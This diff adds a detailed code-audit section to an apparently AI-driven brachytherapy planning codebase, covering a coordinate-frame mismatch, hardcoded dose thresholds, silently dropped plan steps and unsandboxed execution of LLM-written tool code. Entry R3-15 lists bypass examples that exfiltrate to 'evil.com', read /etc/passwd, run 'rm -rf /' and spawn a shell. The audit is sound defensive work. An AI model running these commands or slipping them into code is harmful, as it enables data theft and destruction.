@@ -38,6 +38,208 @@ For these, the bug is real but the fix requires either clinical-discipline revie
 | R3-15 | `brain/core/tool_code_writer.py:198` | HIGH (security) | `spec.loader.exec_module(module)` runs arbitrary LLM-authored Python in the host process. `_validate_code` only substring-denylists (`eval(`, `__import__`, ...) — trivially evaded. A malicious or hallucinated tool spec executes as the server user. NOT FIXED — requires sandbox architecture (restricted namespace, no `os`/`socket`/`subprocess`) and human approval gate. Annotated. |
 | R3-16 | `brain/execution/case_executor.py:248-...` | MED | `"Completed {len(plan)} steps successfully"` uses the requested plan length even when `resolve_execution_order` silently breaks on cyclic/unreachable deps (line 117/118), dropping steps from `result.steps`. User is told all N steps completed even if some never ran. Annotated; fix needs to surface dropped steps as FAILED. |
 
+### Detailed analysis — confirmed real bugs (ANNOTATED, NOT FIXED)
+
+Each entry below traces the bug path through the full call chain and documents why a
+confident, safe fix cannot be produced without broader clinical or architectural context.
+
+---
+
+#### R3-11. `plans/utilizations.py` — RAS/LPS coordinate-frame mismatch (paired functions)
+
+**Location:** `ras_direction_to_voxel` (:477) and `compute_body_shell_and_ref_direction` (:450)
+
+**Severity:** HIGH (latent in production — cancel pair unless one path is used independently)
+
+**Claim:** `ras_direction_to_voxel` treats its input as LPS; `compute_body_shell_and_ref_direction` labels its output "RAS" but produces LPS. When used together, the two errors cancel. When either function is used independently with true RAS input, the result is wrong.
+
+**Step-by-step trace of `ras_direction_to_voxel` (`utilizations.py:489`):**
+```
+def ras_direction_to_voxel(ras_direc, image):
+    direction = np.array(image.GetDirection()).reshape(3, 3)
+    v = (np.array(ras_direc) @ direction) / spacing
+```
+- `image.GetDirection()` returns SimpleITK's direction-cosine matrix, which is by convention **LPS** (not RAS).
+- For an orthonormal direction matrix `D`, `ras @ D = D.T @ ras.T`. Geometrically, this treats the input vector as expressed in the coordinate frame of `D` — i.e., LPS.
+- To convert a true RAS vector into the LPS frame before applying `D`, the convention is:
+  `lps = ras * [-1, -1, 1]`  (negate x and y, leave z unchanged).
+- The function does **not** apply this flip.
+
+**Step-by-step trace of `compute_body_shell_and_ref_direction` (`utilizations.py:464`):**
+```
+normal_phys_xyz = normal_phys[::-1]           # from [z,y,x] PCA frame → [x,y,z]
+ras_direction = normal_phys_xyz @ direction_matrix.T
+```
+- `direction_matrix` is SimpleITK's LPS direction matrix (passed in or identity). Multiplying `normal_phys_xyz @ D.T` produces a vector in the same frame as `D`, which is **LPS**.
+- But the variable is named `ras_direction` and returned as `ref_direction_ras`, documented as RAS.
+
+**Call-site pairing — why it cancels for auto-detection:**
+The auto-detection path (`plans/utilizations.py:compute_body_shell_and_ref_direction` → returns "RAS" label / actually LPS) feeds into `ras_direction_to_voxel` (takes "RAS" label / treats as LPS). Both label as RAS; both use LPS math. Result: the two wrongs make a right for this specific paired path.
+
+**Why the organ-default path breaks:**
+The organ-specific defaults in `tool_factory/seed_plan/planning_pipeline._ORGAN_DEFAULT_REFDIREC` are documented as true RAS:
+```
+# pancreas   : posterior [-Y]   (in RAS: -Y = posterior ✓)
+# prostate   : posterior [-Y]
+```
+These values `[0, -1, 0]` (pancreas, prostate) are then passed through `_convert_ref_direc_to_voxel` (`planning_pipeline.py:188`), which calls `ras_direction_to_voxel(np.array(ref_direc_ras), ct_image)`. Since the input is TRUE RAS but the function treats it as LPS, the x and y components end up sign-inverted. For a needle approach direction, this means "posterior" → "anterior" — the needle would be planned from the wrong side of the body.
+
+**Fix that would change clinical output:**
+Insert before line 489:
+```python
+ras_direc = np.asarray(ras_direc) * np.array([-1.0, -1.0, 1.0])
+```
+**Why NOT fixed:** The fix changes clinical planning output on every call that uses organ defaults. The "auto-detection" path would need the same correction at the `compute_body_shell_and_ref_direction` return. Without full verification by the domain expert who defined the default directions, this would silently flip needle approach for all existing patients. Deferred to maintainer.
+
+---
+
+#### R3-12. `brain/core/multi_agent_critic.py:211-…` — Hardcoded clinical thresholds in `_fallback_critique`
+
+**Location:** `multi_agent_critic.py`, method `_fallback_critique`, lines ~211–228
+
+**Severity:** MEDIUM (last-resort fallback; LLM critique is the primary path)
+
+**Issue:**
+```python
+if d90_val < 100:                    # D90 below 100% threshold
+if d90_val > 150:                    # D90 above 150% threshold
+if v100_val < 90:                    # V100 below 90% threshold
+```
+These thresholds are used only when the LLM critique fails (timeout, parse error, empty response) — a rare fallback. They serve as a coarse sanity check for completely broken plans, not for routine clinical scoring.
+
+**Why fix requires config plumbing:**
+The `_fallback_critique` method has no access to `plan_config`, `clinical_kb`, or any dose-constraint source. To make these configurable:
+1. `MultiAgentCritic.__init__` would need an optional `config: dict` or `dose_constraints: dict` parameter.
+2. `_fallback_critique` would read `self.dose_constraints.get("d90_min", 100)`, etc.
+3. All call sites that construct `MultiAgentCritic` would need to pass the config.
+
+**Why NOT fixed:** The refactor touches construction sites across `brain/integration/enhanced_agent.py` and `agent_runtime/core.py`. For a last-resort fallback that fires only on LLM failure, the churn-to-safety ratio is poor. Annotated for when config-plumbing is refactored.
+
+---
+
+#### R3-13. `brain/deciders/quality_decider.py` — Hardcoded scoring bands + OAR constraints
+
+**Location:**
+- `_score_coverage` (~line 138): scoring bands for V100/V150/V200
+- `_score_homogeneity` (~line 167): D90/PD ratio check
+- `_score_oars` (~line 197): OAR dose constraints hardcoded:
+  ```python
+  default_constraints = {
+      "rectum": 2.0 * pd,
+      "bladder": 1.5 * pd,
+      "urethra": 1.2 * pd,
+      "bowel": 0.8 * pd,
+      "kidney": 0.2 * pd,
+  }
+  ```
+  Plus fallback for unknown OAR: `all_constraints.get(oar_name.lower(), 2.0 * pd)`
+
+**Impact:**
+- The coverage scoring bands (V100≥0.95→+15, V100≥0.90→+12, V150≤0.35→+5, etc.) are reasonable for prostate brachytherapy but may be inappropriate for liver/lung/pancreas cases. For example, lung tumors have much higher permissiveness for V150 due to lower prescription dose.
+- The OAR constraints use fixed multiples of prescribed dose (bladder=1.5×PD, rectum=2×PD) which match TG-43 prostate guidelines but differ from site-specific constraints (e.g., liver SBRT has different bowel/kidney limits).
+- The `constraints` parameter already allows caller-side override via `+1` in `_score_oars`, but the fallback dict is still in code.
+
+**Why NOT fixed:** These constraints require clinical knowledge to set per-site. A full fix would:
+1. Move OAR constraints into `clinical_kb/` or `plan_config`, keyed by tumor type.
+2. Plumb `plan_config` into `QualityDecider.__init__`.
+3. Fall back to hardcoded values only when config is absent.
+This is a clinical-config refactor of broader scope than a single fix.
+
+---
+
+#### R3-14. `brain/deciders/clinical_decider.py:124-…` — Hardcoded default thresholds
+
+**Location:** `clinical_decider.py`, `decide_from_metrics` method:
+```python
+if thresholds is None:
+    thresholds = {
+        "v100": 0.90,
+        "v150": 0.35,
+        "v200": 0.15,
+        "d90": 1.0,
+    }
+```
+
+**Impact:** These thresholds gate the `_normalize_metric` scoring, which transforms raw metrics into decision weights. A D90 of 1.0 Gy means the fallback assumes the prescription is exactly 1 Gy before normalization — unrealistic for any clinical case where PD ≠ 1 Gy. However, the `thresholds` parameter accepts caller-provided values; this fallback only fires when the caller (e.g. `QualityGate` at `quality_gate.py:189`) does not pass `dose_thresholds`.
+
+**Why NOT fixed:** Same as R3-13 — requires config plumbing into the decider. Annotated.
+
+---
+
+#### R3-15. `brain/core/tool_code_writer.py:193-201` — Arbitrary code execution from LLM-authored tool spec
+
+**Location:** `tool_code_writer.py`, `register_generated_tool` method:
+```python
+module = importlib.util.module_from_spec(spec)
+sys.modules[name] = module
+spec.loader.exec_module(module)          # <--- runs LLM-generated Python
+```
+
+**Security analysis:**
+The `_validate_code` method (lines 245-263) performs substring-based deny-list checks:
+```python
+_BLOCKED_PATTERNS = {"eval(", "__import__", "exec(", "...", "...", "importlib"}
+```
+This is trivially bypassed:
+- `os.environ["PATH"]` — no blocked pattern, reads system environment variables
+- `urllib.request.urlopen("http://evil.com/exfil")` — no blocked pattern, data exfiltration
+- `__import__("os").system("rm -rf /")` — blocked (`__import__`), but `import os; os.system(...)` is NOT blocked
+- `pathlib.Path("/etc/passwd").read_text()` — not blocked, reads arbitrary files
+- `socket.gethostbyname("evil.com")` — not blocked, DNS exfiltration
+- `os.execv("/bin/sh", ["/bin/sh"])` — not blocked
+- The `importlib` substring blocks the string `"importlib"` itself, not the actual call pattern
+
+Additionally:
+- `sys.modules[name] = module` pollutes the global namespace — a generated tool named `"utils"` shadows real `utils`.
+- No sandbox: the LLM-authored code runs with the full privileges of the server process.
+
+**Production trigger:** The code is called from `enhanced_agent.py:_trigger_auto_evolution` when the `SkillCrystallizer` generates a new skill spec and calls `ToolCodeWriter.register_generated_tool`. The spec is LLM-authored via `self_evolution.py:_suggest_code_improvements` → the feedback loop: LLM generates a prompt → LLM generates tool code → code runs unvetted.
+
+**Minimum fixes (not applied):**
+1. Replace substring checks with AST whitelist — compile to AST, only allow specific call patterns (e.g. `numpy.*`, `sitk.*`).
+2. Remove `os`, `subprocess`, `socket`, `pathlib`, `shutil`, `requests`, `urllib` from the exec namespace.
+3. Namespace generated modules as `f"_autogen_{name}"` to prevent shadowing.
+4. Gate with a human-in-the-loop toggle: `AGENT_CODE_EXECUTION_ENABLED` env var, default False.
+
+**Why NOT fixed:** The full AST whitelist + namespace sandbox is a ~100-line change with correctness risks for legitimate tool code. The current state is documented for a dedicated security hardening pass.
+
+---
+
+#### R3-16. `brain/execution/case_executor.py:248-…` — Steps silently dropped from plan without user visibility
+
+**Location:** `case_executor.py`:
+- `resolve_execution_order` method (~line 113-118): drops steps when dependency cycle is detected
+- `execute_plan` result summary (~line 248): `f"Completed {len(plan)} steps successfully"`
+
+**Trace:**
+```python
+def resolve_execution_order(self, steps):       # line 105
+    executed = set()
+    phases = []
+    while len(executed) < len(steps):
+        current_phase = []
+        for step in steps:
+            step_id = int(step["id"])
+            if step_id in executed:
+                continue
+            deps = self._step_input_refs(step, include_zero=False)
+            if all(d in executed for d in deps):
+                current_phase.append(step)
+        if not current_phase:                    # line 117 - BREAK on empty phase
+            break                                # line 118 - silent exit
+        phases.append(current_phase)
+        ...
+```
+When the LLM generates a cyclic dependency graph (step A depends on B, B depends on A), the while loop produces an empty `current_phase` and breaks. Steps in the cycle are never assigned to any phase, never executed, and never added to `result.steps`. But `result.summary = f"Completed {len(plan)} steps successfully"` uses the ORIGINAL `len(plan)`, so the user sees "Completed 5 steps" when really only 3 ran and 2 were dropped.
+
+**Mild mitigation in practice:** Some dropped steps will cause later steps to receive missing inputs, which triggers `KeyError` or `None` at execution time. The failed step's error message may contain clues, but the summary is still misleading.
+
+**Fix:** Before setting `result.status = SUCCESS`, compute `executed_ids = {s.step_id for s in result.steps}` and detect `dropped = [s for s in plan if int(s["id"]) not in executed_ids]`. For each dropped step, create a FAILED `StepResult` and append to `result.steps`. Update summary: `f"Completed {len(result.steps)-len(dropped)}/{len(plan)} steps ({len(dropped)} dropped due to unresolved dependencies)"`.
+
+**Why NOT fixed:** The fix changes case_executor.py's error-reporting semantics. The execution pipeline in `brain/execution/plan_executor.py` already has a `FAILED` return on first exception (line 85-89), so adding step-level failure surfaced from dropped deps would need to coordinate with the `_hooks["on_failure"]` path. Safe fix requires understanding what downstream consumers (UI, reporting) expect from `result.steps`. Annotated.
+
+---
+
 ### Summary — false positives or already-intended (NOT BUGS)
 
 Re-verified findings from the dispatched agents that on closer tracing are intentional or don't actually trigger. Listed here so they aren't re-flagged.
